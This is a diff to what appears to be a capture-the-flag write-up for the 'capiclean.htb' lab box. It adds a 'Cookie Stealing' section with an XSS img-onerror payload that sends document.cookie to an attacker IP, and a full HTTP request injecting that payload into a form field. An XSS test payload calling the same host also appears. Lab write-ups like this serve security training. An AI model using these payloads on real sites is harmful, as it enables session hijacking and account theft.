@@ -260,7 +260,7 @@ by Ben "epi" Risher 🤓                 ver: 2.10.4
 ```
 ![image](https://github.com/user-attachments/assets/841e5497-b81d-45e0-be99-b514ee84d582)
 
-# Cross Site Scripting
+## Cross Site Scripting
 - Test payload
 ```shell
 <img src="http://10.10.14.33/invalid" onerror=fetch("http://10.10.14.33/XSS")
@@ -303,3 +303,28 @@ Accept-Language: en-US,en;q=0.9
  sent 0, rcvd 355
 ```
 ![image](https://github.com/user-attachments/assets/520b4778-012d-4e18-b21f-94b62d336833)
+
+## Cookie Stealing
+Payload:
+```
+<img src="http://10.10.14.33/invalid" onerror=fetch("http://10.10.14.33/?p="+document.cookie) />
+```
+
+Request to server:
+```
+POST /sendMessage HTTP/1.1
+Host: capiclean.htb
+Content-Length: 171
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://capiclean.htb/quote
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+service=Carpet+Cleaning&service=Tile+%26+Grout&service=<img src="http://10.10.14.33/invalid" onerror=fetch("http://10.10.14.33/?p="+document.cookie) />&email=test@root.com
+```
